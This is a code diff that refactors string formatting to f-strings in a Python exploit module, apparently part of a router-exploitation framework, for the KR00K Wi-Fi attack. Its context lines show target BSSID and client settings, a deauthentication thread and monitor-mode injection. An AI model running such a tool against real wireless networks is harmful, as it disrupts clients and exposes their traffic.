@@ -122,9 +122,7 @@ class Exploit(Exploit):
 
     @staticmethod
     def _extract_pn(pkt) -> str:
-        return "{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}".format(
-            pkt.PN5, pkt.PN4, pkt.PN3, pkt.PN2, pkt.PN1, pkt.PN0
-        )
+        return f"{pkt.PN5:02x}{pkt.PN4:02x}{pkt.PN3:02x}{pkt.PN2:02x}{pkt.PN1:02x}{pkt.PN0:02x}"
 
     @staticmethod
     def _mac_to_hex(mac: str) -> str:
@@ -214,18 +212,17 @@ class Exploit(Exploit):
 
         if self.dry_run:
             print_info("KR00K Attack Configuration:")
-            print_info("  Interface:  {}".format(self.interface))
-            print_info("  BSSID:      {}".format(self.target_bssid))
-            print_info("  Client:     {}".format(self.target_client))
-            print_info("  Channel:    {}".format(self.channel))
-            print_info("  Deauth:     {} frames a cada {:.1f}s".format(
-                self.deauth_count, self.deauth_interval))
+            print_info(f"  Interface:  {self.interface}")
+            print_info(f"  BSSID:      {self.target_bssid}")
+            print_info(f"  Client:     {self.target_client}")
+            print_info(f"  Channel:    {self.channel}")
+            print_info(f"  Deauth:     {self.deauth_count} frames a cada {self.deauth_interval:.1f}s")
             if self.pcap_input:
-                print_info("  PCAP input: {}".format(self.pcap_input))
+                print_info(f"  PCAP input: {self.pcap_input}")
             return
 
         if self.pcap_input:
-            print_status("Analisando PCAP offline: {}".format(self.pcap_input))
+            print_status(f"Analisando PCAP offline: {self.pcap_input}")
             packets = rdpcap(self.pcap_input)
             for pkt in packets:
                 self._analyze_packet(pkt)
@@ -242,8 +239,8 @@ class Exploit(Exploit):
             print_error("Privilégio root necessário para monitor mode e injeção")
             return
 
-        print_status("Iniciando KR00K Attack no canal {}...".format(self.channel))
-        print_info("BSSID: {}  Client: {}".format(self.target_bssid, self.target_client))
+        print_status(f"Iniciando KR00K Attack no canal {self.channel}...")
+        print_info(f"BSSID: {self.target_bssid}  Client: {self.target_client}")
 
         deauth_thread = threading.Thread(target=self._deauth_loop, daemon=True)
         deauth_thread.start()
